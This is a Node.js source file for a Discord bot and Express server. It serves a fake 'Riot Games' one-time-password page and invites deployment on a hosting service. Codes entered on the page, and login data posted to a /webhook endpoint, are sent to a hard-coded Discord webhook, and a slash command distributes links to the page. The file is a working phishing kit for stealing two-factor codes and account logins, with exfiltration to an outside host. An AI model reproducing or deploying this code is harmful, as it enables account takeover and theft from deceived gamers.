const { Client, GatewayIntentBits, SlashCommandBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder } = require('discord.js');
const express = require('express');
const app = express();
const path = require('path');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1392692196200808508/nWjhLWSCV1S6M_XuhT8nl3FMZ5xfYw4V4j7VgHhyUneUzFsCp05nGcWvQI46fEdMUtWZ';
const BOT_TOKEN = 'YOUR_DISCORD_BOT_TOKEN_HERE'; // Replace with your bot token
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Serve OTP page
app.get('/otp/:id', (req, res) => {
    const otpPage = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Enter OTP - Riot Games</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <style>
                @font-face {
                    font-family: 'Mark Pro';
                    src: url('https://fonts.cdnfonts.com/css/mark-pro');
                }
                body {
                    background: #0a0d15;
                    color: #ffffff;
                    font-family: 'Mark Pro', 'Arial', sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    margin: 0;
                }
                .otp-container {
                    background: #ffffff;
                    color: #111827;
                    padding: 1.5rem;
                    border-radius: 8px;
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
                    width: 100%;
                    max-width: 300px;
                    text-align: center;
                }
                .otp-input {
                    border: 1px solid #4b5563;
                    padding: 0.5rem;
                    border-radius: 6px;
                    width: 100%;
                    margin-bottom: 1rem;
                }
                .otp-submit {
                    background: #ff4655;
                    color: #ffffff;
                    padding: 0.5rem;
                    border-radius: 6px;
                    width: 100%;
                    font-weight: 600;
                    transition: background 0.3s;
                }
                .otp-submit:hover {
                    background: #e53e3e;
                }
                .error {
                    color: #f56565;
                    display: none;
                    margin-top: 0.5rem;
                    font-size: 0.9rem;
                }
            </style>
        </head>
        <body>
            <div class="otp-container">
                <h3 class="text-lg font-bold mb-2">Enter OTP</h3>
                <p class="text-sm mb-2">We sent a code to your email. Please enter it here.</p>
                <form action="/submit-otp" method="POST">
                    <input type="text" name="otp" class="otp-input" placeholder="Enter OTP" required>
                    <input type="hidden" name="id" value="${req.params.id}">
                    <button type="submit" class="otp-submit">Submit OTP</button>
                </form>
                <p id="error" class="error">Please enter the OTP.</p>
            </div>
            <script>
                document.querySelector('form').addEventListener('submit', async (e) => {
                    const errorMsg = document.getElementById('error');
                    const otp = document.querySelector('input[name="otp"]').value;
                    if (!otp) {
                        e.preventDefault();
                        errorMsg.style.display = 'block';
                    }
                });
            </script>
        </body>
        </html>
    `;
    res.send(otpPage);
});

// Handle OTP submission
app.post('/submit-otp', async (req, res) => {
    const { otp, id } = req.body;
    if (!otp) {
        return res.status(400).send('OTP is required');
    }

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `OTP Submitted (ID: ${id}):\nOTP: ${otp}` })
        });
        res.send('OTP submitted successfully!');
    } catch (err) {
        console.error('Webhook error:', err);
        res.status(500).send('Failed to submit OTP');
    }
});

// Handle login webhook from website
app.post('/webhook', async (req, res) => {
    const { content } = req.body;
    if (!content) {
        return res.status(400).send('No content provided');
    }

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content })
        });
        res.status(200).send('Webhook sent');
    } catch (err) {
        console.error('Webhook error:', err);
        res.status(500).send('Failed to send webhook');
    }
});

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    if (interaction.commandName === 'sendotp') {
        const uniqueId = Date.now().toString();
        const otpUrl = `https://your-bot.onrender.com/otp/${uniqueId}`; // Replace with your Render URL
        const button = new ButtonBuilder()
            .setLabel('Enter OTP')
            .setURL(otpUrl)
            .setStyle(ButtonStyle.Link);
        const row = new ActionRowBuilder().addComponents(button);

        await interaction.reply({
            content: 'Click the button to enter your OTP:',
            components: [row],
            ephemeral: true
        });
    }
});

// Register slash command
client.on('ready', async () => {
    const command = new SlashCommandBuilder()
        .setName('sendotp')
        .setDescription('Sends a link to enter an OTP code');
    await client.application.commands.create(command);
});

client.login(BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});